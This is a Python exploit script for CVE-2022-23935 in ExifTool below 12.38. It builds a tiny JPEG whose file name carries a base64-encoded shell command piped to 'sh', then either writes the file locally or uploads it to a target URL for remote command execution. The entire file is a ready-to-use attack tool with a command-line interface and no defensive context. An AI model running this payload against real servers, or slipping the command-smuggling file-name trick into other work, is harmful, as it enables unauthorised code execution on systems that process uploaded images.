#!/usr/bin/env python3
from requests import post, exceptions
from argparse import ArgumentParser
from base64 import b64encode
from urllib.parse import unquote

def getJpgFile() -> bytes:
    return b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xFF\xDB\x00\x43\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xC2\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x01\x00\x01\x3F\x10"

def getFileName(command: str) -> str:
    encodedCommand = str(b64encode(command.encode()), "utf-8")
    return f"echo {encodedCommand} | base64 -d | sh |"

def writePayload(command: str):
    fileName = getFileName(command)        
    fileBytes = getJpgFile()
    with open(fileName, "wb") as payload:
        payload.write(fileBytes)
    print(f"Created payload file as '{fileName}'. Using exiftool <12.38 on the file will execute the command")

def parsePostData(dataString: str) -> dict:
    data = {}
    keyValues = dataString.split('&')
    for keyValue in keyValues:
        key, value = keyValue.split('=')
        data[unquote(key)] = unquote(value)
    return data

def sendPayloadInRequest(url: str, command: str, postKey: str, data: dict):
    fileName = getFileName(command)
    imageBytes = getJpgFile()
    image = {postKey: (fileName, imageBytes, "application/octet-stream")}

    response = post(url, files=image, data=data, timeout=3) 
    if response.status_code != 200:
        print(f"Got status code {response.status_code} to file upload")

def getArguments():
    parser = ArgumentParser(description="Exploit for CVE-2022-23935 (Exiftool <12.38)")
    parser.add_argument("-c", "--command", required=True, help="The command to execute")
    parser.add_argument("-u", "--url", required=False, help="Url to the endpoint where the file should be uploaded (e.g: http://mysite.com/upload.php)")
    parser.add_argument("-k", "--key", default="image", help="The file key used in the POST request (Default: 'image')")
    parser.add_argument("-d", "--data", required=False, help="Additional data (in x-www-form-urlencoded format) to send in POST request (e.g: csrf=1234&hello=World)")
    return parser.parse_args()

def main():
    args = getArguments()
    if not args.url:
        writePayload(args.command)
        return

    url = args.url if args.url.startswith("http") else f"http://{args.url}"
    data = parsePostData(args.data) if args.data else None

    try:
        sendPayloadInRequest(url, args.command, args.key, data)
    except exceptions.ReadTimeout:
        print("Request timed out")
    print("\nDone! Quitting..")

if __name__ == "__main__":
    main()
